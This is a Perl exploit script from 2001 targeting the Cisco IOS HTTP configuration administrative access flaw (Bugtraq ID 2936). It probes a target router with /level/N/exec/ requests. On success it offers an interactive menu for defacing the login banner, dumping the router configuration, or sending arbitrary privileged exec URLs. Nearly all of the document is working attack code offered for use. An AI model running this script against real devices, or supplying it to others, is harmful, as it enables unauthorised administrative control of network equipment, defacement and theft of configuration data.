#!/usr/bin/perl
#
# Exploit for Cisco IOS HTTP Configuration Arbitrary Administrative
# Access Vulnerability - Found: 06-27-01 - Bugtraq ID: 2936
# Written by hypoclear on 07-03-01
#
# This vulnerability seems to be a hot topic, even though I thought
# it was lame.  Because of that and since I seem to write a lot of 
# Cisco exploits, I figured why not write one for this...
#
# usage: ./ios.pl <host>
#
# hypoclear - hypoclear@jungle.net - http://hypoclear.cjb.net
# This and all of my programs fall under my disclaimer, which
# can be found at: http://hypoclear.cjb.net/hypodisclaim.txt

use IO::Socket; 

die "\nusage: $0 <host>\n\n" unless @ARGV > 0;
$num = 16;

while ($num <100)
 { sender("GET /level/$num/exec/- HTTP/1.0\n\n");
   $webRecv =~ s/\n//g;
   if ($webRecv =~ /200 ok/)
    { while(1)
        { print "\n$AGRV[0] is Vulnerable.  Try an attack:\n";
          print "1: Banner change\n";
          print "2: List vty 0 4 acl info\n";
          print "3: Other\n";
          print "Enter option (^C quits): ";
          $attack = <STDIN>; chomp($attack);

          if    ($attack == 1)
           { print "\nEnter deface line: ";
             $attack = <STDIN>; chomp($attack);
             sender("GET /level/$num/exec/-/configure/-/banner/motd/$attack HTTP/1.0\n\n");
           }
          elsif ($attack == 2)
           { sender("GET /level/$num/exec/show%20conf HTTP/1.0\n\n"); 
             print "$webRecvFull";
           }
          elsif ($attack == 3) 
           { print "\nEnter attack URL: ";
             $attack = <STDIN>; chomp($attack);
             sender("GET /$attack HTTP/1.0\n\n");
             print "$webRecvFull";
           }
         }
       }
       $webRecv = ""; $num++;
     }
die "Not vulnerable...\n\n";


sub sender
  { $sendsock = IO::Socket::INET -> new(Proto     => 'tcp',
                                        PeerAddr  => $ARGV[0],
                                        PeerPort  => 80,
                                        Type      => SOCK_STREAM,
                                        Timeout   => 5);
        unless($sendsock){die "Can't connect to $ARGV[0]"}
   $sendsock->autoflush(1);

   $sendsock -> send($_[0]);
   while(<$sendsock>){$webRecv .= $_} $webRecvFull = $webRecv;
   close $sendsock;
  }
